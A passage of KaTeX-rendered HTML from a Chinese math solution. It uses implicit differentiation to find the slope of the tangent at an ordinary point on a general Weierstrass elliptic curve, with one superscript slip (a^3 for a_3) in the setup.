style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.0585479999999998em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.9474379999999999em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.0141079999999998em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.73333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">6</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord cjk_fallback">上</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">平</span><span class="mord cjk_fallback">常</span><span class="mord cjk_fallback">点</span><span class="mord mathnormal">A</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">)</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">切</span><span class="mord cjk_fallback">线</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">斜</span><span class="mord cjk_fallback">率</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord cjk_fallback">。</span></span></span></span></span></p>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mtext>解：令</mtext><mi>F</mi><mo stretchy="false">(</mo><mi>x</mi><mo separator="true">,</mo><mi>y</mi><mo stretchy="false">)</mo><mo>=</mo><msup><mi>y</mi><mn>2</mn></msup><mo>+</mo><msub><mi>a</mi><mn>1</mn></msub><mi>x</mi><mi>y</mi><mo>+</mo><msup><mi>a</mi><mn>3</mn></msup><mi>y</mi><mo>−</mo><msup><mi>x</mi><mn>3</mn></msup><mo>−</mo><msub><mi>a</mi><mn>2</mn></msub><msup><mi>x</mi><mn>2</mn></msup><mo>−</mo><msub><mi>a</mi><mn>4</mn></msub><mi>x</mi><mo>−</mo><msub><mi>a</mi><mn>6</mn></msub><mspace linebreak="newline"></mspace><mtext>求偏导数</mtext><mo>:</mo><msub><mi>F</mi><mi>x</mi></msub><mo stretchy="false">(</mo><mi>x</mi><mo separator="true">,</mo><mi>y</mi><mo stretchy="false">)</mo><mo>=</mo><msub><mi>a</mi><mn>1</mn></msub><mi>y</mi><mo>−</mo><mn>3</mn><msup><mi>x</mi><mn>2</mn></msup><mo>−</mo><mn>2</mn><msub><mi>a</mi><mn>2</mn></msub><mi>x</mi><mo>−</mo><msub><mi>a</mi><mn>4</mn></msub><mspace linebreak="newline"></mspace><msub><mi>F</mi><mi>y</mi></msub><mo stretchy="false">(</mo><mi>x</mi><mo separator="true">,</mo><mi>y</mi><mo stretchy="false">)</mo><mo>=</mo><mn>2</mn><mi>y</mi><mo>+</mo><msub><mi>a</mi><mn>1</mn></msub><mi>x</mi><mo>+</mo><msub><mi>a</mi><mn>3</mn></msub><mspace linebreak="newline"></mspace><mtext>则导数为：</mtext><msup><mi>f</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>=</mo><mo>−</mo><msub><mi>F</mi><mi>x</mi></msub><mo stretchy="false">(</mo><mi>x</mi><mo separator="true">,</mo><mi>y</mi><mo stretchy="false">)</mo><mi mathvariant="normal">/</mi><msub><mi>F</mi><mi>y</mi></msub><mo stretchy="false">(</mo><mi>x</mi><mo separator="true">,</mo><mi>y</mi><mo stretchy="false">)</mo><mo>=</mo><mo>−</mo><mo stretchy="false">(</mo><msub><mi>a</mi><mn>1</mn></msub><mi>y</mi><mo>−</mo><mn>3</mn><msup><mi>x</mi><mn>2</mn></msup><mo>−</mo><mn>2</mn><msub><mi>a</mi><mn>2</mn></msub><mi>x</mi><mo>−</mo><msub><mi>a</mi><mn>4</mn></msub><mo stretchy="false">)</mo><mi mathvariant="normal">/</mi><mo stretchy="false">(</mo><mn>2</mn><mi>y</mi><mo>+</mo><msub><mi>a</mi><mn>1</mn></msub><mi>x</mi><mo>+</mo><msub><mi>a</mi><mn>3</mn></msub><mo stretchy="false">)</mo><mo>=</mo><mo stretchy="false">(</mo><mn>3</mn><msup><mi>x</mi><mn>2</mn></msup><mo>+</mo><mn>2</mn><msub><mi>a</mi><mn>2</mn></msub><mi>x</mi><mo>+</mo><msub><mi>a</mi><mn>4</mn></msub><mo>−</mo><msub><mi>a</mi><mn>1</mn></msub><mi>y</mi><mo stretchy="false">)</mo><mi mathvariant="normal">/</mi><mo stretchy="false">(</mo><mn>2</mn><mi>y</mi><mo>+</mo><msub><mi>a</mi><mn>1</mn></msub><mi>x</mi><mo>+</mo><msub><mi>a</mi><mn>3</mn></msub><mo stretchy="false">)</mo><mspace linebreak="newline"></mspace><mtext>所以</mtext><mi>k</mi><mo>=</mo><mo stretchy="false">(</mo><mn>3</mn><msup><mi>x</mi><mn>2</mn></msup><mo>+</mo><mn>2</mn><msub><mi>a</mi><mn>2</mn></msub><mi>x</mi><mo>+</mo><msub><mi>a</mi><mn>4</mn></msub><mo>−</mo><msub><mi>a</mi><mn>1</mn></msub><mi>y</mi><mo stretchy="false">)</mo><mi mathvariant="normal">/</mi><mo stretchy="false">(</mo><mn>2</mn><mi>y</mi><mo>+</mo><msub><mi>a</mi><mn>1</mn></msub><mi>x</mi><mo>+</mo><msub><mi>a</mi><mn>3</mn></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">解：令F(x,y)= y^2+a_1xy+a^3y-x^3-a_2x^2-a_4x-a_6 
   \\求偏导数: 
   F_x(x,y)= a_1y-3x^2-2a_2x-a_4 
   \\ F_y(x,y)= 2y+a_1x +a_3 
   \\ 则导数为：f&#x27;(x)=-F_x(x,y)/F_y(x,y)=-( a_1y-3x^2-2a_2x-a_4)/(2y+a_1x +a_3) 
                   = (3x^2+2a_2x+a_4-a_1y) /(2y+a_1x +a_3) 
   \\ 所以k=(3x^2+2a_2x+a_4-a_1y) /(2y+a_1x +a_3)
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord cjk_fallback">解</span><span class="mord cjk_fallback">：</span><span class="mord cjk_fallback">令</span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.0585479999999998em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.7777700000000001em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal">x</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.0585479999999998em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.9474379999999999em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.0141079999999998em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.73333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">6</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord cjk_fallback">求</span><span class="mord cjk_fallback">偏</span><span class="mord cjk_fallback">导</span><span class="mord cjk_fallback">数</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">x</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.7777700000000001em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.9474379999999999em;vertical-align:-0.08333em;"></span><span class="mord">3</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.79444em;vertical-align:-0.15em;"></span><span class="mord">2</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:1.036108em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">y</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8388800000000001em;vertical-align:-0.19444em;"></span><span class="mord">2</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.73333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:1.051892em;vertical-align:-0.25em;"></span><span class="mord cjk_fallback">则</span><span class="mord cjk_fallback">导</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">为</span><span class="mord cjk_fallback">：</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.801892em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.036108em;vertical-align:-0.286108em;"></span><span class="mord">−</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">x</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">)</span><span class="mord">/</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">y</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">−</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.9474379999999999em;vertical-align:-0.08333em;"></span><span class="mord">3</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.79444em;vertical-align:-0.15em;"></span><span class="mord">2</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mord">/</span><span class="mopen">(</span><span class="mord">2</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.73333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.1141079999999999em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">3</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.79444em;vertical-align:-0.15em;"></span><span class="mord">2</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.73333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" 